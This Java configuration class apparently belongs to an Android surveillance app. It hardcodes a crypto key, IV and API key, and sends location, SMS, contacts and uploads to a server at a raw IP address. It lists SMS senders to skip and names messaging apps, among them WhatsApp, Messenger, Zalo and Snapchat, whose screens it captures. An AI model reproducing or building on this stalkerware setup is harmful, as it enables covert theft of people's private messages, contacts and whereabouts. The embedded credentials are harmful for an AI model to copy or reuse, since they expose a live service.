package com.sunnet.service.util;

import java.util.ArrayList;

public class ConfigApi {
    //-- Crypto
    public static final String KEY_CRYPTO = "500b83454e65db1a6bf4152473247216577f87dec387ee563a9e46a248ca4385";
    public static final String IV_CRYPTO = "ac52060c76cbbc5be12cead76af8b2a3";

    public static final String DEFAULT_PHONE_NUMBER = "011";

    public static final int TIME_OUT = 90;
    public static final String HEADER_API = "";
    public static final String URL_HOST = "http://128.199.234.7:3030/"; //"http://128.199.234.7:3003/";
    public static final String URL_HOST_UPLOAD = "http://128.199.234.7/upload/test.php/";//"http://128.199.234.7/";
    //public static final String URL_HOST_UPLOAD = "http://192.168.0.107/";
    public static final String API_KEY = "wnTdm7Mx7VdZzgV6VU9az6gF";

    public static final String ADD_LOCATION = "add-location";
    public static final String ADD_SMS = "add-sms";
    public static final String ADD_CONTACT = "add-contact";
    public static final String UPLOAD = "upload";

    public enum STATUS_RESPONSE {
        SUCCESS(1),
        INCORRECT_PARAM(-101),
        KEY_API_OUT_DATE(-102),
        SIZE_OUT(-103);

        private int value;

        STATUS_RESPONSE(int value) {
            this.value = value;
        }

        public int getValue() {
            return value;
        }
    }

    private static ArrayList<String> smsIgnoreList = new ArrayList<>();

    static {
        smsIgnoreList.add("195");
        smsIgnoreList.add("+195");
        smsIgnoreList.add("199");
        smsIgnoreList.add("+199");
        smsIgnoreList.add("NAPTHE_VT");
        smsIgnoreList.add("VIETTEL_KM");
        smsIgnoreList.add("MOCHA");
    }

    public static boolean ignoreSms(String sender) {
        return smsIgnoreList.contains(sender.toUpperCase());
    }

    /**
     * Config app screenshots
     */
    private static ArrayList<String> pckAppScreenShotList = new ArrayList<>();

    static {
        pckAppScreenShotList.add("com.facebook.katana"); // Facebook
        pckAppScreenShotList.add("com.facebook.orca"); // Facebook Messenger
        pckAppScreenShotList.add("com.zing.zalo"); // Zalo
        pckAppScreenShotList.add("com.viber.voip"); // Viber
        pckAppScreenShotList.add("com.skype.raider"); // Skype
        pckAppScreenShotList.add("com.google.android.talk"); // Hangouts
        pckAppScreenShotList.add("jp.naver.line.android"); // Line
        pckAppScreenShotList.add("com.whatsapp"); // What App
        pckAppScreenShotList.add("com.sgiggle.production"); // Tango
        pckAppScreenShotList.add("com.Slack"); // Slack
        pckAppScreenShotList.add("jp.naver.line.android"); // Line
        pckAppScreenShotList.add("com.snapchat.android"); // Snap Chat
    }

    public static boolean packageCanTakeScreenShot(String pck){
        return pckAppScreenShotList.contains(pck);
    }

}
